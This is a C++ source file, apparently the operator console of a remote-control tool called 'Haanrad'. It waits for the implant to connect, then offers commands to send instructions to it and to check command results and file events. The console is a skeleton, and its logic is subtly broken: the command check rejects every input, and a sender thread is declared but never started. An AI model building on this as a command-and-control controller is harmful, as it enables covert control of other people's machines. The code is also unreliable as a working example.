#include <iostream>
#include <cstring>
#include "MessageQueue.h"
#include "CommHandler.h"
#include "../shared/Logger.h"
#include "../shared/HCrypto.h"


void * listenBootstrapper(void * commHandlerListener){
    CommHandler * listener = (CommHandler *)commHandlerListener;
    listener->listenForMessages();
}

void * sendBootstrapper(void * commHandlerSender){
    CommHandler * sender = (CommHandler *)commHandlerSender;
    sender->processMessagesToSend();
}



int main() {

    cout << "==== Initializing Haanrad Console ====" << endl;
    //Logger::setDebug(true);

    //Create MessageQueue
    MessageQueue * queue = new MessageQueue();
    HCrypto * crypto = new HCrypto();

    //Create CommHandler
    // - Pass MessageQueue
    CommHandler * commHandler = CommHandler::getInstance(queue, crypto);

    pthread_t listenerThread;
    pthread_t senderThread;

    pthread_create(&listenerThread, NULL, &listenBootstrapper, commHandler);

    //Spawn CommHandler on new Thread

    //while

        //wait for message from MessageQueue

        //print out

        //wait for input from user if message requires it (Message Can Be An Object ?)


    cout << ":> Initialization Complete" << endl;
    cout << ":> Haanrad Must Connect Before Interactivity Will Enable" << endl;

    bool haanradConnected = false;
    bool promptedHelp = false;

    while(1){

        Message message = queue->recvFromHaanrad();
        if(message.interMessageCode != InterClientMessageType::EMPTY){

            if(message.messageType == MessageType::INTERCLIENT){

                switch(message.interMessageCode){
                    case InterClientMessageType::CONNECTED:{
                        cout << ":> " << message.data << endl;
                        cout << ":> " << "Enabling Interactivity" << endl;
                        haanradConnected = true;
                    }
                }
            }

            if(haanradConnected && promptedHelp == false){
                cout << ":> Interactivity Has Now Been Enabled. The Following KeyWords Are Available:" << endl;
                cout << ":> \t send <command>\t\tSend A Command To Haanrad Using Valid Haanrad Commands" << endl;
                cout << ":> \t check \t\t\t\tCheck For New Messages Sent From Haanrad. This Includes Command Results Or File Events" << endl;
                promptedHelp = true;
            }

            int BUFFERLEN = 1024;
            char BUFFER[BUFFERLEN];
            memset(BUFFER, '\0', BUFFERLEN);

            cout << ":> ";
            cin >> BUFFER;
            string command(BUFFER);

            if(command.find("send") != 0 || command.find("check") != 0){
                cout << ":> Invalid Command Entered. Cannot Process" << endl;
                promptedHelp = false;
                continue;
            }

        }
    }





    return 0;
}